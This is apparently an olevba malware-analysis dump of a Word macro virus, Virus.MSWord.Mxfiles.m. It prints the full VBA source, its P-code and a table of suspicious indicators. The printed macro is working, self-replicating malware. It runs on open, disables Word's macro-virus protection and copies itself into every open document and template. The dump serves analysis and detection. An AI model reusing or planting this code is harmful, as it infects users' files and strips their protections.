olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles.m - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub

Sub Mxfiles()
Dim txt As String, ddorg As String
Dim a As Integer, dest As String
Dim dd, dd1, dd2, ff$
Dim dayn, monthn, reg, View
Dim data As Date
txt = " s-¦ ¦ß¦f-µ+ +-+ µ¦f- +¦- µ¯ß p¦f¦µp +s ¯-¦+s ++¦-+ ¯ßS¦ S+¦f+ p+¦-¯"
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
Next a
ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
If Val(ff$) = 255 Then
Application.ScreenUpdating = True
Exit Sub
End If
data = Now
dayn = Day(data)
monthn = Month(data)
reg = dayn Mod monthn
If reg = 0 And dayn > 10 Then
If ActiveWindow.ActivePane.View.Type <> wdPageView Then
View = ActiveWindow.ActivePane.View.Type
ActiveWindow.ActivePane.View.Type = wdPageView
End If
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  'Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  'Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
ActiveWindow.ActivePane.View.Type = View
End If
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mxfiles.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Mxfile - 4482 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall Mxfiles 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Openshell())
' Line #4:
' 	ArgsCall Mxfiles 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' 	FuncDefn (Sub Mxfiles())
' Line #8:
' 	Dim 
' 	VarDefn txt (As String)
' 	VarDefn ddorg (As String)
' Line #9:
' 	Dim 
' 	VarDefn a (As Integer)
' 	VarDefn dest (As String)
' Line #10:
' 	Dim 
' 	VarDefn dd
' 	VarDefn dd1
' 	VarDefn dd2
' 	VarDefn ff
' Line #11:
' 	Dim 
' 	VarDefn dayn
' 	VarDefn monthn
' 	VarDefn reg
' 	VarDefn View
' Line #12:
' 	Dim 
' 	VarDefn data (As Date)
' Line #13:
' 	LitStr 0x0044 " s-¦ ¦ß¦f-µ+ +-+ µ¦f- +¦- µ¯ß p¦f¦µp +s ¯-¦+s ++¦-+ ¯ßS¦ S+¦f+ p+¦-¯"
' 	St txt 
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #19:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St ddorg 
' Line #20:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #22:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #23:
' 	Ld dest 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld ddorg 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	St dd 
' Line #34:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dd1 
' Line #35:
' 	Ld dd1 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld dd 
' 	Add 
' 	St dd2 
' Line #36:
' 	Ld dd2 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #37:
' 	Ld ddorg 
' 	Ld dd2 
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dd2 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	LitStr 0x0007 "network"
' 	ParamNamed appname 
' 	LitStr 0x0004 "unix"
' 	ParamNamed Section 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed Key 
' 	ArgsLd GetSetting 0x0003 
' 	St ff$ 
' Line #42:
' 	Ld ff$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x00FF 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #44:
' 	ExitSub 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld Now 
' 	St data 
' Line #47:
' 	Ld data 
' 	ArgsLd Day 0x0001 
' 	St dayn 
' Line #48:
' 	Ld data 
' 	ArgsLd Month 0x0001 
' 	St monthn 
' Line #49:
' 	Ld dayn 
' 	Ld monthn 
' 	Mod 
' 	St reg 
' Line #50:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld dayn 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdPageView 
' 	Ne 
' 	IfBlock 
' Line #52:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	St View 
' Line #53:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #56:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #57:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #58:
' 	QuoteRem 0x0002 0x0027 "Selection.TypeText Text:=Right(txt, 16)"
' Line #59:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #60:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #61:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #62:
' 	QuoteRem 0x0002 0x0027 "Selection.TypeText Text:=Right(txt, 16)"
' Line #63:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #64:
' 	Ld View 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	EndSub 
' Line #68:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

